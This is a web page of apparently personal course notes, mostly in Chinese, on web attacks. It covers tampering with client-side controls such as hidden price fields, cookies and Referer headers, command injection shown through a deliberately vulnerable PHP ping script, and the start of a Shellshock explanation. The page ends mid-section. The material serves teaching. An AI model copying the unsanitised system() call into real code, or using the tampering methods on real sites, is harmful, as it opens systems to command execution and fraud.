@@ -1,0 +1,946 @@
+<!DOCTYPE html>
+<html lang="en-uk" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='SCT Topic 4: Web Attacks - Bypassing client-side authentication and others Bypassing client-Side Controls 客户端检查绕过 绕过客户端的检查主要是针对两个方面， 页面HTML代码 HTTP请求 客户端的检查一般来说都能被轻松的绕'><title>SCT Topic 4: Web Attacks - Bypassing client-side authentication and others</title>
+
+<link rel='canonical' href='https://ginkgo.org.cn/posts/sct_topic_4_web_attacks_bypassing_client-side_authentication_and_others/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='SCT Topic 4: Web Attacks - Bypassing client-side authentication and others'>
+<meta property='og:description' content='SCT Topic 4: Web Attacks - Bypassing client-side authentication and others Bypassing client-Side Controls 客户端检查绕过 绕过客户端的检查主要是针对两个方面， 页面HTML代码 HTTP请求 客户端的检查一般来说都能被轻松的绕'>
+<meta property='og:url' content='https://ginkgo.org.cn/posts/sct_topic_4_web_attacks_bypassing_client-side_authentication_and_others/'>
+<meta property='og:site_name' content='Under The Ginkgo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='security_testing' /><meta property='article:published_time' content='2022-05-20T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-05-22T22:35:14&#43;01:00'/>
+<meta name="twitter:title" content="SCT Topic 4: Web Attacks - Bypassing client-side authentication and others">
+<meta name="twitter:description" content="SCT Topic 4: Web Attacks - Bypassing client-side authentication and others Bypassing client-Side Controls 客户端检查绕过 绕过客户端的检查主要是针对两个方面， 页面HTML代码 HTTP请求 客户端的检查一般来说都能被轻松的绕">
+    <link rel="shortcut icon" href="/img/favicon.ico" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
+                            height="237" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧐</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
+            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/medic0803'
+                        target="_blank"
+                        title="A_GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:medicwrf@gmail.com'
+                        target="_blank"
+                        title="B_E-mail"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/course_notes/" >
+                course_notes
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/sct_topic_4_web_attacks_bypassing_client-side_authentication_and_others/">SCT Topic 4: Web Attacks - Bypassing client-side authentication and others</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 20, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    5 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="sct-topic-4-web-attacks-bypassing-client-side-authentication-and-others">SCT Topic 4: Web Attacks - Bypassing client-side authentication and others</h2>
+<h3 id="bypassing-client-side-controls-客户端检查绕过">Bypassing client-Side Controls 客户端检查绕过</h3>
+<p>绕过客户端的检查主要是针对两个方面， <!-- raw HTML omitted --></p>
+<ul>
+<li>页面HTML代码 <!-- raw HTML omitted --></li>
+<li>HTTP请求 <!-- raw HTML omitted --></li>
+</ul>
+<p>客户端的检查一般来说都能被轻松的绕过，主要的防御手段还是服务器端需要进行严格的输入净化，但是设置合理的客户端检查可以帮助正常的用户减少麻烦 <!-- raw HTML omitted --></p>
+<p>我们直接来看具体的种类和例子吧 <!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p>URL parameters URL参数 <!-- raw HTML omitted -->
+URL后面接的GET参数可以被轻易修改 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://example.com/shop/?prod=3&amp;price=32&amp;currency=USD
+</span></span></code></pre></div></li>
+<li>
+<p>Hidden form fields 隐藏的表格内容 <!-- raw HTML omitted -->
+有些网页会有隐藏的表单内容用于后续的提交，这些表格可以轻易被浏览器的开发工具所修改，因此服务器端也得对这部分的数据做严格的审核 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Please enter the required quantity:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;Shop.aspx?prod=1&#34;</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl">Product: xPhone Ultimate <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span> Price: 449 <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">(Maximum quantity is 50)<span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;price&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;449&#34;</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Buy&#34;</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>Length limits 长度限制 <!-- raw HTML omitted -->
+长度的限制也可以轻易被修改 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Please enter the required quantity:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;Shop.aspx?prod=1&#34;</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl">Product: iPhone Ultimate <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">Price: 449 <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">Quantity: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;quantity&#34;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&#34;1&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">(Maximum quantity is 50) <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">”hidden”</span> <span class="na">name</span><span class="o">=</span><span class="s">”price”</span> <span class="na">value</span><span class="o">=</span><span class="s">”449”</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">”submit”</span> <span class="na">value</span><span class="o">=</span><span class="s">”Buy”</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>Disabled elements 不可修改的元素 <!-- raw HTML omitted -->
+开发者工具修改 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Please enter the required quantity:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;Shop.aspx?prod=1&#34;</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl">Product: iPhone Ultimate <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">Price: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;price&#34;</span> <span class="na">disabled</span><span class="o">=</span><span class="s">&#34;true&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;449&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">Quantity: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;quantity&#34;</span><span class="p">&gt;</span>(Maximum quantity is 50) <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Buy&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>Script-based validation <!-- raw HTML omitted -->
+前端的JS脚本检查，可以通过debugger，Burp抓住请求后直接修改，chrome可以直接修改 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;Shop.aspx?prod=2&#34;</span> <span class="na">onsubmit</span><span class="o">=</span><span class="s">&#34;return validateForm(this)&#34;</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl">Product: Samsung Multiverse <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span> 
+</span></span><span class="line"><span class="cl">Price: 399 <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">Quantity: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;quantity&#34;</span> <span class="err">(</span><span class="na">Maximum</span> <span class="na">quantity</span> <span class="na">is</span> <span class="na">50</span><span class="err">)</span> <span class="err">&lt;</span><span class="na">br</span><span class="p">/&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Buy&#34;</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">validateForm</span><span class="p">(</span><span class="nx">theForm</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">isInteger</span> <span class="o">=</span> <span class="sr">/^\d+$/</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">valid</span> <span class="o">=</span> <span class="nx">isInteger</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">quantity</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">quantity</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">quantity</span> <span class="o">&lt;=</span> <span class="mi">50</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">valid</span><span class="p">)</span> <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Please enter a valid quantity&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nx">valid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>Referer header <!-- raw HTML omitted -->
+Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /auth/472/CreateUser.ashx HTTP/1.1 
+</span></span><span class="line"><span class="cl">Host: mdsec.net 
+</span></span><span class="line"><span class="cl">Referer: https://mdsec.net/auth/472/Admin.ashx
+</span></span></code></pre></div></li>
+<li>
+<p>HTTP cookies <!-- raw HTML omitted -->
+Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /shop/92/Shop.aspx?prod=3 HTTP/1.1 
+</span></span><span class="line"><span class="cl">Host: mdsec.net 
+</span></span><span class="line"><span class="cl">Cookie: DiscountAgreed=25 
+</span></span><span class="line"><span class="cl">Content-Length: 10
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">quantity=1
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="local-remote-file-inclusion--lfi-rfi--文件包含">Local/Remote File Inclusion (LFI/RFI) 文件包含</h3>
+<p>详见：<a class="link" href="https://ginkgo.org.cn/posts/lrfi_basic/"  target="_blank" rel="noopener"
+    >https://ginkgo.org.cn/posts/lrfi_basic/</a> <!-- raw HTML omitted --></p>
+<h3 id="command-injection-命令行注入">Command Injection 命令行注入</h3>
+<p>命令行注入漏洞主要由黑客利用PHP中来执行系统命令的函数来执行自己的恶意代码(e.g., system(), exec(),  popen()). <!-- raw HTML omitted --></p>
+<p>参数通常由POST or GET参数传入 <!-- raw HTML omitted --></p>
+<p>例如我们有一个ping.php需要传入一个GET参数来测试一个host的ping连接，但是如果我们用 <code>‘;’</code> 拼接这个ping指令，就可以执行额外的操作 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;ping -c 4 &#39;</span><span class="o">.</span><span class="nv">$host</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-22_10-13-15_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<h3 id="shellshock">Shellshock</h3>
+<p>接下来我们来介绍一个很典型的命令行注入的漏洞，叫做Shellshock， <!-- raw HTML omitted --></p>
+<h4 id="knowledge-prerequisites">Knowledge Prerequisites</h4>
+<p>我们平时经常使用终端来进行一些文件操作，以及安装命令行工具来增强其功能。 <!-- raw HTML omitted --></p>
+<p>那么相信大家也将会经常被配置环境参数搞的头疼不已，而在shellshock中我们正是利用环境变量来注入命令行。 <!-- raw HTML omitted --></p>
+<p>首先大家一般在Linux上使用的终端都是bash，shellshock也发生在老版本的bash上面 <!-- raw HTML omitted --></p>
+<p>接下来，我们将通过比较Bash在一般模式下的变量定义的表现，以及对比开启一个新的bash子进程之后，这些变量会有什么表现来进一步了解这些令人头疼的变量 <!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p>普通shell变量和bash子进程中的变量 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:26<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nv">gu</span><span class="o">=</span><span class="s2">&#34;hacker&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:26<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">echo</span> <span class="nv">$gu</span>
+</span></span><span class="line"><span class="cl">hacker
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:26<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ bash <span class="c1">#进入子进程</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:27<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">echo</span> <span class="nv">$gu</span> <span class="c1">#无事发生</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:27<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:27<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
+</span></span></code></pre></div></li>
+</ol>
+<p>结论：bash子进程没有继承普通shell的变量 <code>$gu</code> <!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p>普通环境变量与bash子进程中的环境变量 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:31<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">echo</span> <span class="nv">$gu</span>
+</span></span><span class="line"><span class="cl">hacker
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:32<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> gu
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:32<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ bash
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:32<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">echo</span> <span class="nv">$gu</span> <span class="c1">#继承了环境变量</span>
+</span></span><span class="line"><span class="cl">hacker
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:32<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:32<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
+</span></span></code></pre></div></li>
+</ol>
+<p>结论：bash子进程继承了普通shell中定义的环境变量 <code>$gu</code> <!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p>普通函数变量和bash子进程中的函数变量 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:37<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ gu<span class="o">()</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;gu is a hacker&#34;</span><span class="p">;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:37<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ gu
+</span></span><span class="line"><span class="cl">gu is a hacker
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:38<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ bash
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:38<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ gu <span class="c1"># gu未被定义</span>
+</span></span><span class="line"><span class="cl">gu: <span class="nb">command</span> not found
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:38<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:38<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
+</span></span></code></pre></div></li>
+</ol>
+<p>结论：bash子进程没有继承函数变量 <code>gu</code> <!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p>函数环境变量和bash子进程中的函数环境变量 <!-- raw HTML omitted --></p>
